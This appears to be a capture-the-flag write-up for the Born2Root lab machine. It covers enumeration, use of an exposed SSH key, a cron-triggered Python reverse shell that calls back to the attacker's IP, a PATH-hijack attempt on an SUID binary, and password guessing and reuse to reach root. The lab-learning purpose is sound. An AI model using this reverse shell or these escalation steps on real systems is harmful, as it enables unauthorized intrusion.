### Born2Root Proving Grounds

### Difficulty = Intermediate

### IP Address = 192.168.66.49

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Born2Root]
└─$ nmap -sCV -A 192.168.66.49 -p22,80,111 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-23 22:42 WAT
Nmap scan report for 192.168.66.49
Host is up.

PORT    STATE    SERVICE VERSION
22/tcp  filtered ssh
80/tcp  filtered http
111/tcp filtered rpcbind

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds
```

Nothing really much ports

Lets enumerate the web server running

On heading there we see its a security company that defends against cyber threats 
![image](https://user-images.githubusercontent.com/113513376/214156846-21b52eb9-50a2-44de-b793-46f2f0f6ac1b.png)

And just looking at the page we see some potential usernames and also a potential domain name in the contact us tab

```
secretsec.com 
```

So i'll update my `/etc/hosts` file and add the new domain found

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Born2Root]
└─$ sudo nano /etc/hosts      
[sudo] password for mark: 

┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Born2Root]
└─$ cat /etc/hosts | grep secre
192.168.66.49   secretsec.com
```

I'll also save the potential names in a file called `potentialusers` 

```

┌──(mark__haxor)-[~/Desktop/B2B/Pg/Practice/Born2Root]
└─$ nano potentialusers

┌──(mark__haxor)-[~/Desktop/B2B/Pg/Practice/Born2Root]
└─$ cat potentialusers 
martin
hadi
jimmy
Martin N
Hadi M
Jimmy S
```

So on checking the `robots.txt` file on the web server shows that there are two directories
![image](https://user-images.githubusercontent.com/113513376/214158773-52fe25cf-9860-4c3c-b824-9cd285d37cec.png)

When navigating to `/files` it doesn't contain anything
![image](https://user-images.githubusercontent.com/113513376/214158899-705ac73c-c88f-4b5c-94b7-9530af9f3b2f.png)

So checking the other directory which is `/wordpress-blog` leads to this trolled page hahaha 
![image](https://user-images.githubusercontent.com/113513376/214159232-25683aee-2fe2-4ac9-a035-2f355ff9a2c1.png)

Lets now do a proper directory fuzzing scan 

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Born2Root]
└─$ gobuster dir -u http://192.168.66.49/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.66.49/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/01/23 23:05:18 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/files                (Status: 301) [Size: 314] [--> http://192.168.66.49/files/]
/icons                (Status: 301) [Size: 314] [--> http://192.168.66.49/icons/]
/index.html           (Status: 200) [Size: 5651]
/manual               (Status: 301) [Size: 315] [--> http://192.168.66.49/manual/]
/robots.txt           (Status: 200) [Size: 57]
/server-status        (Status: 403) [Size: 301]
Progress: 4611 / 4615 (99.91%)===============================================================
2023/01/23 23:07:27 Finished
===============================================================
```

Now lets check out `/icons` directory

There are lots of file but the one of interest is that weird file `VDSoyuAXiO.txt`
![image](https://user-images.githubusercontent.com/113513376/214163597-1e60ee27-5527-4570-8a27-cc18b48a0663.png)

Now lets view the text file
![image](https://user-images.githubusercontent.com/113513376/214163790-d4d2b2be-1e9d-4a08-aa6c-4faec825e264.png)

Thats a ssh key for a user 

And now that we have a ssh key but we don't know which user it belongs to 

I'll try connecting to each user in the wordlist we generated earlier

And luckily martin worked just fine 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Born2Root]
└─$ ssh -i idrsa martin@192.168.66.49                                   

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 23 23:44:35 2023 from 192.168.49.66

READY TO ACCESS THE SECRET LAB ? 

secret password : 
```

It asks for secret password giving it anything works just fine

Also you will need to add `export TERM=xterm` cause the screen won't clear if you use `clear` command

```
martin@debian:~$ ls
local.txt
martin@debian:~$ cat local.txt 
060de34fc7b481ac4dd68665db7cc76b
martin@debian:~$
```

Now lets get root 

I'll upload linpeas to the machine

Crontab shows there's a script running in the `/tmp` directory

```
martin@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5   * * * *   jimmy   python /tmp/sekurity.py
```

But checking the `/tmp` directory doesn't show anything

```
martin@debian:/tmp$ ls
vmware-root
```

So what i did next was to create a file called `sekurity.py` which has a python reverse shell content and saved in the `/tmp` directory

In hope that when cron runs again i'll get shell as jimmy

```
martin@debian:/tmp$ nano sekurity.py 
martin@debian:/tmp$ cat sekurity.py 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.66",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
martin@debian:/tmp$
```

Now we wait for 5minutes 

After 5mins we get shell as jimmy

```                                                                                                                                                                                                                
┌──(mark__haxor)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.49.66] from (UNKNOWN) [192.168.66.49] 55861
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1002(jimmy) gid=1002(jimmy) groups=1002(jimmy)
$ 
```

Now lets stabilze the shell 

```
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
```

The user's directory has an suid file 

```
jimmy@debian:~$ ls
networker
jimmy@debian:~$ ls -l networker 
-rwsrwxrwx 1 root root 7496 Jun  9  2017 networker
jimmy@debian:~$
```

Running it looks it pings the localhost ip

```
jimmy@debian:~$ ./networker
*** Networker 2.0 *** 
eth0      Link encap:Ethernet  HWaddr 00:50:56:bf:7c:b8  
          inet addr:192.168.66.49  Bcast:192.168.66.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:febf:7cb8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:203103 errors:0 dropped:0 overruns:0 frame:0
          TX packets:172088 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:22232553 (21.2 MiB)  TX bytes:59118840 (56.3 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:22 errors:0 dropped:0 overruns:0 frame:0
          TX packets:22 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1556 (1.5 KiB)  TX bytes:1556 (1.5 KiB)

PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.014 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms
Done 
echo linux tool version 5
```

I'll transfer it over to my machine to decompile it and see whats happening

```
jimmy@debian:~$ python -m SimpleHTTPServer 8081
Serving HTTP on 0.0.0.0 port 8081 ...
```

Now i'll get the file over to my machine

```
──(mark__haxor)-[~/_/B2B/Pg/Practice/Born2Root]
└─$ wget 192.168.66.49:8081/networker
--2023-01-24 00:29:54--  http://192.168.66.49:8081/networker
Connecting to 192.168.66.49:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7496 (7.3K) [application/octet-stream]
Saving to: _networker_

networker                                            100%[=====================================================================================================================>]   7.32K  --.-KB/s    in 0.008s  

2023-01-24 00:29:54 (948 KB/s) - _networker_ saved [7496/7496]
```

Now i'll use ghidra to decompile the binary 

Looking at the main function we get this
![image](https://user-images.githubusercontent.com/113513376/214176089-04396da9-5b39-458d-b44c-c4ca10f58340.png)

```
undefined4 main(void)

{
  puts("*** Networker 2.0 *** ");
  system("/sbin/ifconfig");
  system("/bin/ping -c 1  localhost ");
  printf("Done \n ");
  system("echo \'echo linux tool version 5\' ");
  return 0;
}

```

So here's whats happening

```
1. It prints out "*** Networker 2.0 *** "
2. It run ifconfig to know the network interfaces present
3. Then it pings the localhost (127.0.0.1) and sends only 1 packet 
4. It then echo "echo linux tool verion 5"
```

Nothing really much in it but there's a vulnerability we can take advantage of which is PATH Hijack

PATH variables can be easily performed if programmers forget to add absolute paths instead of just names and relative paths

In this case the programmer forgot to add the full path to the echo binary 

So lets exploit this xD

```
jimmy@debian:~$ echo "/bin/id" > echo
jimmy@debian:~$ chmod +x echo
jimmy@debian:~$ export PATH=.:$PATH
jimmy@debian:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
jimmy@debian:~$ 
```

Now i'll run the suid binary again 

```
jimmy@debian:~$ ./networker 
*** Networker 2.0 *** 
eth0      Link encap:Ethernet  HWaddr 00:50:56:bf:7c:b8  
          inet addr:192.168.66.49  Bcast:192.168.66.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:febf:7cb8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:205961 errors:0 dropped:0 overruns:0 frame:0
          TX packets:173916 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:22474582 (21.4 MiB)  TX bytes:59352548 (56.6 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:38 errors:0 dropped:0 overruns:0 frame:0
          TX packets:38 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:2900 (2.8 KiB)  TX bytes:2900 (2.8 KiB)

PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.011 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.011/0.011/0.011/0.000 ms
Done 
echo linux tool version 5
 jimmy@debian:~$
 ```
  
 
Weird it failed 

But executing the binary works well
  
```
jimmy@debian:~$ ./echo 
uid=1002(jimmy) gid=1002(jimmy) groups=1002(jimmy)
```
  
Attempting to call the binary fails 
  
```
jimmy@debian:~$ echo

jimmy@debian:~$
```
 
Thats why it doesn't work cause even when we hijacked the path it doesn't really still execute it

Anyways what a dead end 🤧

Lets move on 

Checking the `/home` shows there's another user called `hadi`

```
jimmy@debian:/home$ ls
hadi  jimmy  martin
jimmy@debian:/home
```

In the home directory of the user theres a binary which is vulnerable to buffer overflow but i won't go into that cause thats a big rabbit hole

Why!!! cause there's no way we can inject shellcode, no way to perform ROP Chain so its a dead end lol

Anyways I then tried switching to the user using her name with numbers and luckily `hadi123` works

```
jimmy@debian:/home$ su hadi
Password: 
hadi@debian:/home$
```

Hydra would also have worked well, but i like trying weak credentials xD

I then tried credential reuse by using the same cred as hadi with root and it worked 

```
hadi@debian:/home$ su root
Password: 
root@debian:/home# cd /root
root@debian:~# ls -al
total 36
drwx------  3 root root 4096 Jan 23 22:39 .
drwxr-xr-x 21 root root 4096 Feb 22  2020 ..
-rw-------  1 root root    0 Jul 13  2020 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-------  1 root root    2 Jun  4  2017 .gdb_history
-rw-r--r--  1 root root   22 May 10  2017 .gdbinit
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
drwxr-xr-x  2 root root 4096 May  1  2017 .ssh
-rw-r--r--  1 root root   32 Jul 13  2020 flag.txt
-rw-r--r--  1 root root   33 Jan 23 22:39 proof.txt
root@debian:~# 
```

And we're done 


<br> <br>
[Back To Home](../../index.md)
<br>
  







                   
                                       
